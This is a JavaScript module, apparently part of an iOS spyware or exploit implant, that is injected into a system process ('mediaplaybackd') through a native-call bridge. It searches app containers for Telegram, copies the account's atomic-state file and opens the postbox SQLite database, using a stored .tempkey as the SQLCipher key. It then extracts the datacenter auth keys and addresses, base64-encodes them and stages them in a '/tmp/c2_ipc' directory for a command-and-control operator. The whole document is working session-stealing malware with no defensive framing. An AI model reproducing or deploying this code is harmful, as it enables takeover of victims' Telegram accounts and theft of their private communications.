// telegram_v1 — pe hot-load (mediaplaybackd eval via pe_load / agent.cmd).
// Slim TG convert inputs: atomic-state + postbox t1 pair. No sqlite/wal/shm upload.
// Do not name this session_* (pe rejects those for eval).
(function () {
	var OUT = "/tmp/tg_auth";
	var MARK = "/tmp/c2_ipc/tg_v1.done";
	var N = (typeof Native !== "undefined" && Native) ? Native : globalThis.Native;
	function log(s) {
		try {
			if (typeof globalThis.LOG === "function") globalThis.LOG("[TG-V1] " + s);
		} catch (_) {}
	}
	function access(p) {
		try { return Number(N.callSymbol("access", String(p || ""), 0)) === 0; } catch (_) { return false; }
	}
	function mkdirp(p) {
		try { N.callSymbol("mkdir", String(p || ""), 0x1ff); } catch (_) {}
		try { N.callSymbol("chmod", String(p || ""), 0x1ff); } catch (_) {}
	}
	function isDir(p) {
		try {
			var d = N.callSymbol("opendir", String(p || ""));
			if (d && d !== 0n) {
				try { N.callSymbol("closedir", d); } catch (_) {}
				return true;
			}
		} catch (_) {}
		return false;
	}
	function read64(p) {
		try {
			if (typeof N.read64 === "function") return N.read64(typeof p === "bigint" ? p : BigInt(p));
		} catch (_) {}
		try {
			var b = new Uint8Array(N.read(typeof p === "bigint" ? p : BigInt(p), 8));
			var v = 0n;
			for (var i = 7; i >= 0; i--) v = (v << 8n) | BigInt(b[i]);
			return v;
		} catch (_) {
			return 0n;
		}
	}
	function writeUtf8(path, body) {
		try {
			var s = String(body || "");
			var fd = Number(N.callSymbol("open", path, 0x601, 0x1ff));
			if (!(fd >= 0)) return false;
			var buf = N.callSymbol("malloc", s.length + 1);
			if (typeof N.writeString === "function") N.writeString(buf, s);
			else {
				var ab = new Uint8Array(s.length + 1);
				for (var i = 0; i < s.length; i++) ab[i] = s.charCodeAt(i) & 255;
				N.write(buf, ab.buffer);
			}
			N.callSymbol("write", fd, buf, s.length);
			N.callSymbol("free", buf);
			N.callSymbol("close", fd);
			try { N.callSymbol("chmod", path, 0x1ff); } catch (_) {}
			return true;
		} catch (_) {
			return false;
		}
	}
	function listNames(dir) {
		var out = [];
		try {
			var d = N.callSymbol("opendir", String(dir || ""));
			if (!d || d === 0n) return out;
			for (;;) {
				var ent = N.callSymbol("readdir", d);
				if (!ent || ent === 0n) break;
				var name = "";
				try { name = N.readString(ent + 21n, 256); } catch (_) { name = ""; }
				if (!name || name === "." || name === "..") continue;
				out.push(name);
				if (out.length > 80) break;
			}
			try { N.callSymbol("closedir", d); } catch (_) {}
		} catch (_) {}
		return out;
	}
	function copyFile(src, dst) {
		try {
			if (!access(src)) return { ok: false, size: 0, err: "missing" };
			var srcFd = Number(N.callSymbol("open", src, 0));
			if (srcFd < 0) return { ok: false, size: 0, err: "open_src" };
			var dstFd = Number(N.callSymbol("open", dst, 0x601, 0x1ff));
			if (dstFd < 0) {
				try { N.callSymbol("close", srcFd); } catch (_) {}
				return { ok: false, size: 0, err: "open_dst" };
			}
			var chunk = 65536;
			var cap = 80 * 1024 * 1024;
			var total = 0;
			var buf = N.callSymbol("malloc", chunk);
			if (!buf || buf === 0n) {
				try { N.callSymbol("close", srcFd); } catch (_) {}
				try { N.callSymbol("close", dstFd); } catch (_) {}
				return { ok: false, size: 0, err: "malloc" };
			}
			try {
				for (;;) {
					if (total >= cap) break;
					var nr = Number(N.callSymbol("read", srcFd, buf, chunk));
					if (!(nr > 0)) break;
					var nw = Number(N.callSymbol("write", dstFd, buf, nr));
					if (!(nw > 0)) { total = 0; break; }
					total += nw;
				}
			} finally {
				try { N.callSymbol("free", buf); } catch (_) {}
				try { N.callSymbol("close", srcFd); } catch (_) {}
				try { N.callSymbol("close", dstFd); } catch (_) {}
			}
			try { N.callSymbol("chmod", dst, 0x1ff); } catch (_) {}
			return { ok: total > 0, size: total, err: total > 0 ? "" : "empty" };
		} catch (e) {
			return { ok: false, size: 0, err: String(e).slice(0, 80) };
		}
	}
	function b64FromLatin1(bin) {
		bin = String(bin || "");
		var n = bin.length | 0;
		if (!(n > 0)) return "";
		if (n > 256 * 1024) n = 256 * 1024;
		var T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		var out = [];
		for (var i = 0; i < n; i += 3) {
			var a = bin.charCodeAt(i) & 255;
			var b = (i + 1 < n) ? (bin.charCodeAt(i + 1) & 255) : 0;
			var c = (i + 2 < n) ? (bin.charCodeAt(i + 2) & 255) : 0;
			var triple = (a << 16) | (b << 8) | c;
			out.push(T.charAt((triple >> 18) & 63));
			out.push(T.charAt((triple >> 12) & 63));
			out.push((i + 1 < n) ? T.charAt((triple >> 6) & 63) : "=");
			out.push((i + 2 < n) ? T.charAt(triple & 63) : "=");
		}
		return out.join("");
	}
	function u8ToB64(u8) {
		if (!u8 || !u8.length) return "";
		var s = "";
		var n = u8.length;
		if (n > 256 * 1024) n = 256 * 1024;
		for (var i = 0; i < n; i++) s += String.fromCharCode(u8[i] & 255);
		return b64FromLatin1(s);
	}
	function sqliteOpen(path) {
		try {
			var buf = N.callSymbol("calloc", 1, 8);
			var rc = Number(N.callSymbol("sqlite3_open_v2", String(path || ""), buf, 0x01, 0n));
			if (rc !== 0) {
				try { N.callSymbol("free", buf); } catch (_) {}
				return null;
			}
			var db = read64(buf);
			N.callSymbol("free", buf);
			try { N.callSymbol("sqlite3_busy_timeout", db, 3000); } catch (_) {}
			return db;
		} catch (_) {
			return null;
		}
	}
	function sqliteExec(db, sql) {
		if (!db || !sql) return false;
		try {
			var errBuf = N.callSymbol("calloc", 1, 8);
			var rc = Number(N.callSymbol("sqlite3_exec", db, String(sql), 0n, 0n, errBuf));
			try { N.callSymbol("free", errBuf); } catch (_) {}
			return rc === 0;
		} catch (_) {
			return false;
		}
	}
	function readFileU8(path, maxn) {
		try {
			var fd = Number(N.callSymbol("open", String(path || ""), 0));
			if (!(fd >= 0)) return null;
			var cap = maxn || 256;
			var buf = N.callSymbol("malloc", cap);
			var nr = Number(N.callSymbol("read", fd, buf, cap));
			N.callSymbol("close", fd);
			if (!(nr > 0)) {
				try { N.callSymbol("free", buf); } catch (_) {}
				return null;
			}
			var u8 = new Uint8Array(N.read(buf, nr));
			N.callSymbol("free", buf);
			return u8;
		} catch (_) {
			return null;
		}
	}
	function applyTempKey(db, tdRoot) {
		if (!db || !tdRoot) return false;
		var kp = String(tdRoot) + "/.tempkey";
		if (!access(kp)) return false;
		var u8 = readFileU8(kp, 128);
		if (!u8 || !u8.length) return false;
		var hex = "";
		for (var i = 0; i < u8.length; i++) {
			var h = (u8[i] & 255).toString(16);
			hex += h.length < 2 ? ("0" + h) : h;
		}
		var pragma = "PRAGMA key = \"x'" + hex + "'\"";
		log("try .tempkey len=" + u8.length);
		return sqliteExec(db, pragma);
	}
	function sqliteBlobB64(db, key) {
		if (!db || !key) return "";
		var stmt = 0n;
		var keyBuf = 0n;
		try {
			var stmtBuf = N.callSymbol("calloc", 1, 8);
			var sql = "SELECT value FROM t1 WHERE key = ? LIMIT 1";
			var rc = Number(N.callSymbol("sqlite3_prepare_v2", db, sql, -1, stmtBuf, 0n));
			if (rc !== 0) {
				try { N.callSymbol("free", stmtBuf); } catch (_) {}
				// fallback: quoted text key (older TG)
				stmtBuf = N.callSymbol("calloc", 1, 8);
				sql = "SELECT value FROM t1 WHERE key = '" + String(key).replace(/'/g, "") + "' LIMIT 1";
				rc = Number(N.callSymbol("sqlite3_prepare_v2", db, sql, -1, stmtBuf, 0n));
				if (rc !== 0) {
					try { N.callSymbol("free", stmtBuf); } catch (_) {}
					return "";
				}
				stmt = read64(stmtBuf);
				N.callSymbol("free", stmtBuf);
			} else {
				stmt = read64(stmtBuf);
				N.callSymbol("free", stmtBuf);
				var ks = String(key);
				keyBuf = N.callSymbol("malloc", ks.length + 1);
				if (typeof N.writeString === "function") N.writeString(keyBuf, ks);
				try { N.callSymbol("sqlite3_bind_blob", stmt, 1, keyBuf, ks.length, 0n); } catch (_) {
					try { N.callSymbol("sqlite3_bind_text", stmt, 1, keyBuf, ks.length, 0n); } catch (_2) {}
				}
			}
			if (Number(N.callSymbol("sqlite3_step", stmt)) !== 100) return "";
			var pb = BigInt(N.callSymbol("sqlite3_column_blob", stmt, 0));
			var plen = Number(N.callSymbol("sqlite3_column_bytes", stmt, 0));
			if (!pb || pb === 0n || !(plen > 0)) return "";
			var u8 = new Uint8Array(N.read(pb, plen));
			return u8ToB64(u8);
		} catch (_) {
			return "";
		} finally {
			try { if (stmt) N.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
			try { if (keyBuf) N.callSymbol("free", keyBuf); } catch (_) {}
		}
	}
	function sqliteProbeT1(db) {
		if (!db) return { n: -1, sample: "" };
		var stmt = 0n;
		try {
			var stmtBuf = N.callSymbol("calloc", 1, 8);
			var rc = Number(N.callSymbol("sqlite3_prepare_v2", db, "SELECT key FROM t1 LIMIT 3", -1, stmtBuf, 0n));
			if (rc !== 0) {
				try { N.callSymbol("free", stmtBuf); } catch (_) {}
				return { n: -2, sample: "prepare_fail_" + rc };
			}
			stmt = read64(stmtBuf);
			N.callSymbol("free", stmtBuf);
			var keys = [];
			while (Number(N.callSymbol("sqlite3_step", stmt)) === 100 && keys.length < 3) {
				try {
					var t = N.callSymbol("sqlite3_column_text", stmt, 0);
					var n = Number(N.callSymbol("sqlite3_column_bytes", stmt, 0));
					if (t && n > 0) keys.push(N.readString(BigInt(t), Math.min(n, 80)) || "");
				} catch (_) {}
			}
			return { n: keys.length, sample: keys.join("|") };
		} catch (e) {
			return { n: -3, sample: String(e).slice(0, 40) };
		} finally {
			try { if (stmt) N.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
		}
	}
	function extractT1FromPath(path, tdRoot) {
		// Prefer R/W open on copies so SQLCipher key pragma can settle.
		var db = null;
		try {
			var buf = N.callSymbol("calloc", 1, 8);
			var flags = path.indexOf("/tmp/") === 0 ? 0x02 : 0x01; // READWRITE on tmp copy
			var rc = Number(N.callSymbol("sqlite3_open_v2", String(path || ""), buf, flags, 0n));
			if (rc !== 0) {
				try { N.callSymbol("free", buf); } catch (_) {}
				db = sqliteOpen(path);
			} else {
				db = read64(buf);
				N.callSymbol("free", buf);
				try { N.callSymbol("sqlite3_busy_timeout", db, 5000); } catch (_) {}
			}
		} catch (_) {
			db = sqliteOpen(path);
		}
		if (!db) return { err: "sqlite_open_fail" };
		try {
			var probe0 = sqliteProbeT1(db);
			var auth = sqliteBlobB64(db, "persistent:datacenterAuthInfoById");
			var addr = sqliteBlobB64(db, "persistent:datacenterAddressSetById");
			if ((!auth || !addr) && tdRoot) {
				applyTempKey(db, tdRoot);
				var probe1 = sqliteProbeT1(db);
				log("t1 probe after_key n=" + probe1.n + " sample=" + String(probe1.sample || "").slice(0, 120));
				if (!auth) auth = sqliteBlobB64(db, "persistent:datacenterAuthInfoById");
				if (!addr) addr = sqliteBlobB64(db, "persistent:datacenterAddressSetById");
			} else if (probe0.n >= 0) {
				log("t1 probe plain n=" + probe0.n + " sample=" + String(probe0.sample || "").slice(0, 120));
			}
			if (!auth && !addr) return { err: "t1_empty" };
			return { datacenterAuthInfoById: auth || "", datacenterAddressSetById: addr || "", err: "" };
		} finally {
			try { N.callSymbol("sqlite3_close", db); } catch (_) {}
		}
	}
	function extractT1(postbox, tdRoot) {
		var hit = extractT1FromPath(postbox, tdRoot);
		if (hit && (hit.datacenterAuthInfoById || hit.datacenterAddressSetById)) return hit;
		var tmpDb = OUT + "/_postbox.db";
		try {
			var cr = copyFile(postbox, tmpDb);
			if (!(cr && cr.ok)) return hit || { err: "copy_fail" };
			if (access(postbox + "-wal")) copyFile(postbox + "-wal", tmpDb + "-wal");
			if (access(postbox + "-shm")) copyFile(postbox + "-shm", tmpDb + "-shm");
			hit = extractT1FromPath(tmpDb, tdRoot);
		} catch (_) {
			hit = hit || { err: "extract_throw" };
		}
		try { N.callSymbol("unlink", tmpDb); } catch (_) {}
		try { N.callSymbol("unlink", tmpDb + "-wal"); } catch (_) {}
		try { N.callSymbol("unlink", tmpDb + "-shm"); } catch (_) {}
		return hit;
	}
	function resolveTd(root) {
		var cands = [
			(root || "") + "/telegram-data",
			(root || "") + "/Library/Application Support/Telegram/telegram-data",
			root || ""
		];
		for (var i = 0; i < cands.length; i++) {
			if (cands[i] && access(cands[i] + "/accounts-metadata/atomic-state")) return cands[i];
			if (cands[i] && access(cands[i] + "/atomic-state")) return cands[i];
		}
		return "";
	}
	function atomicPath(td, root) {
		var cands = [
			(td || "") + "/accounts-metadata/atomic-state",
			(td || "") + "/atomic-state",
			(root || "") + "/telegram-data/accounts-metadata/atomic-state"
		];
		for (var i = 0; i < cands.length; i++) {
			if (cands[i] && access(cands[i]) && !isDir(cands[i])) return cands[i];
		}
		return "";
	}
	function scoreRoot(root) {
		if (!root) return 0;
		var score = 0;
		var td = resolveTd(root);
		if (td) score += 25;
		if (atomicPath(td, root)) score += 80;
		if (access((td || root) + "/.tempkey")) score += 15;
		var names = listNames(td || root);
		for (var i = 0; i < names.length; i++) {
			if (String(names[i]).indexOf("account-") !== 0) continue;
			if (access((td || root) + "/" + names[i] + "/postbox/db/db_sqlite")) score += 40;
		}
		return score;
	}
	function scanBase(base, limit) {
		var out = [];
		var n = 0;
		try {
			var d = N.callSymbol("opendir", base);
			if (!d || d === 0n) return out;
			for (;;) {
				var ent = N.callSymbol("readdir", d);
				if (!ent || ent === 0n) break;
				n++;
				if (n > (limit || 220)) break;
				var name = "";
				try { name = N.readString(ent + 21n, 256); } catch (_) { name = ""; }
				if (!name || name === "." || name === ".." || name.length < 30) continue;
				var root = base + "/" + name;
				var meta = root + "/.com.apple.mobile_container_manager.metadata.plist";
				if (!access(meta)) continue;
				var txt = "";
				try {
					var fd = Number(N.callSymbol("open", meta, 0));
					if (fd >= 0) {
						var buf = N.callSymbol("malloc", 4096);
						var nr = Number(N.callSymbol("read", fd, buf, 4095));
						N.callSymbol("close", fd);
						if (nr > 0) txt = N.readString(buf, nr) || "";
						N.callSymbol("free", buf);
					}
				} catch (_) {}
				var low = txt.toLowerCase();
				var hit = low.indexOf("telegra") >= 0 || low.indexOf("telegram") >= 0;
				var score = scoreRoot(root);
				if (!hit && score < 25) continue;
				var gid = "";
				if (txt.indexOf("group.ph.telegra.Telegraph") >= 0) gid = "group.ph.telegra.Telegraph";
				else if (txt.indexOf("ph.telegra.Telegraph") >= 0) gid = "ph.telegra.Telegraph";
				out.push({ path: root, score: score, group_id: gid, uuid: name });
				if (score >= 80) break;
			}
			try { N.callSymbol("closedir", d); } catch (_) {}
		} catch (_) {}
		return out;
	}
	function findAppGroup() {
		var groups = scanBase("/var/mobile/Containers/Shared/AppGroup", 220);
		if (!groups.length) groups = scanBase("/var/mobile/Containers/Data/Application", 180);
		groups.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
		return groups.length ? groups[0] : null;
	}
	function readUtf8(path, maxn) {
		try {
			var fd = Number(N.callSymbol("open", path, 0));
			if (!(fd >= 0)) return "";
			var cap = maxn || 262144;
			var buf = N.callSymbol("malloc", cap);
			var nr = Number(N.callSymbol("read", fd, buf, cap - 1));
			N.callSymbol("close", fd);
			var s = (nr > 0) ? (N.readString(buf, nr) || "") : "";
			N.callSymbol("free", buf);
			return s;
		} catch (_) {
			return "";
		}
	}

	if (access(MARK) && access(OUT + "/atomic-state") && access(OUT + "/db_t1.json")
		&& !(globalThis.__TG_V1_FORCE || globalThis.__pe_tg_v1_force)) {
		log("already done - skip");
		return;
	}
	// Re-run when prior pass missed t1 (atomic only) or operator force.
	if (access(MARK) && !access(OUT + "/db_t1.json")) {
		log("prior t1 miss - retry extract");
		try { N.callSymbol("unlink", MARK); } catch (_) {}
	}
	mkdirp("/tmp/c2_ipc");
	mkdirp(OUT);
	var rec = {
		ok: false,
		kind: "telegram_v1",
		mode: "pe_t1_extract",
		module_id: "telegram_v1",
		app_id: "ph.telegra.Telegraph",
		ts: Date.now(),
		files: [],
		error: ""
	};
	try {
		var hit = findAppGroup();
		if (!hit || !hit.path) {
			rec.error = "appgroup_not_found";
			writeUtf8(OUT + "/manifest.json", JSON.stringify(rec) + "\n");
			writeUtf8(MARK, JSON.stringify(rec) + "\n");
			log("appgroup_not_found");
			globalThis.__pe_telegram_v1 = rec;
			return;
		}
		rec.group = hit.path;
		rec.group_id = hit.group_id || "";
		var td = resolveTd(hit.path);
		rec.telegram_data = td || "";
		var atomic = atomicPath(td, hit.path);
		rec.atomic_path = atomic || "";
		if (atomic) {
			var cr = copyFile(atomic, OUT + "/atomic-state");
			rec.files.push({ name: "atomic-state", ok: !!cr.ok, size: cr.size || 0, err: cr.err || "" });
		}
		var accountId = "";
		try {
			var raw = atomic ? readUtf8(atomic, 262144) : "";
			var m = raw.match(/"currentRecordId"\s*:\s*"?(\d+)/);
			if (!m) m = raw.match(/"rawValue"\s*:\s*(\d{6,})/);
			if (!m) m = raw.match(/"id"\s*:\s*\{\s*"rawValue"\s*:\s*(\d+)/);
			if (m) accountId = m[1];
		} catch (_) {}
		rec.account_id = accountId || "";
		var postbox = "";
		var names = listNames(td || hit.path);
		if (accountId && access((td || hit.path) + "/account-" + accountId + "/postbox/db/db_sqlite"))
			postbox = (td || hit.path) + "/account-" + accountId + "/postbox/db/db_sqlite";
		if (!postbox) {
			for (var i = 0; i < names.length; i++) {
				if (String(names[i]).indexOf("account-") !== 0) continue;
				var p = (td || hit.path) + "/" + names[i] + "/postbox/db/db_sqlite";
				if (access(p)) { postbox = p; break; }
			}
		}
		rec.postbox_path = postbox || "";
		rec.tempkey = !!(td && access(td + "/.tempkey"));
		var t1 = postbox ? extractT1(postbox, td || "") : null;
		if (t1 && (t1.datacenterAuthInfoById || t1.datacenterAddressSetById)) {
			var t1Body = JSON.stringify({
				datacenterAuthInfoById: t1.datacenterAuthInfoById || "",
				datacenterAddressSetById: t1.datacenterAddressSetById || ""
			});
			writeUtf8(OUT + "/db_t1.json", t1Body + "\n");
			rec.files.push({
				name: "db_t1.json", ok: true, size: t1Body.length,
				auth_b64: (t1.datacenterAuthInfoById || "").length,
				addr_b64: (t1.datacenterAddressSetById || "").length
			});
			log("t1 extract OK auth_b64=" + (t1.datacenterAuthInfoById || "").length);
		} else {
			rec.error = postbox ? ("t1_extract_miss:" + ((t1 && t1.err) || "empty")) : "postbox_missing";
			log("t1 miss err=" + rec.error + " tempkey=" + !!rec.tempkey);
		}
		var okN = 0;
		for (var fi = 0; fi < rec.files.length; fi++) if (rec.files[fi].ok) okN++;
		rec.ok = !!(atomic && okN);
		rec.ok_count = okN;
		if (rec.ok && !rec.error) rec.error = "";
		var ready = {
			ok: rec.ok,
			skip_reason: rec.error || "",
			ok_count: okN,
			group: rec.group || "",
			atomic: !!atomic,
			postbox: !!postbox,
			account_id: accountId || "",
			files: rec.files,
			module_id: "telegram_v1",
			app_id: "ph.telegra.Telegraph",
			out_dir: OUT,
			ts: Date.now()
		};
		writeUtf8(OUT + "/manifest.json", JSON.stringify(rec) + "\n");
		writeUtf8("/tmp/c2_ipc/tg_auth.ready", JSON.stringify(ready) + "\n");
		writeUtf8("/tmp/tg_auth.ready", JSON.stringify(ready) + "\n");
		writeUtf8(MARK, JSON.stringify(rec) + "\n");
		log("done ok=" + rec.ok + " n=" + okN + " err=" + (rec.error || ""));
	} catch (e) {
		rec.error = String(e).slice(0, 120);
		writeUtf8(OUT + "/manifest.json", JSON.stringify(rec) + "\n");
		writeUtf8(MARK, JSON.stringify(rec) + "\n");
		log("ERR " + rec.error);
	}
	globalThis.__pe_telegram_v1 = rec;
})();
